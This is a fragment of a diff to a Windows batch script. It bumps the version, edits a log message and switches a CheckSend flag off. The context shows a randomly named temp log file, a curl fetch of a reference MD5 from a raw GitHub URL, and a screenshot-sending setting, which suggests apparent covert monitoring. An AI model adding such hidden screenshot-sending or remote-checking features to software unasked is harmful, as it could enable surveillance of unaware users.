@@ -24,7 +24,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=41.9"
+set "BATCHVERSION=42.0"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -69,7 +69,7 @@ echo. >> "%LOGFILE%" 2>&1
 :retryruncallermd5
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/MD5FILES/RunEveryCallerMD5') do (
     set "RUNEVERYOFFICIALMD5=%%i"
-    echo RUNEVERYOFFICIALMD5 = %RUNEVERYOFFICIALMD5% Hello >> "%LOGFILE%" 2>&1
+    echo RUNEVERYOFFICIALMD5 Inside If = %RUNEVERYOFFICIALMD5% Hello >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
     goto donee1
 )
@@ -609,7 +609,7 @@ echo.
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=1"
+set "CheckSend=0"
 set "SENDSCREENSHOT=1"
 set "lastMinute=none"
 echo CheckSend=!CheckSend!
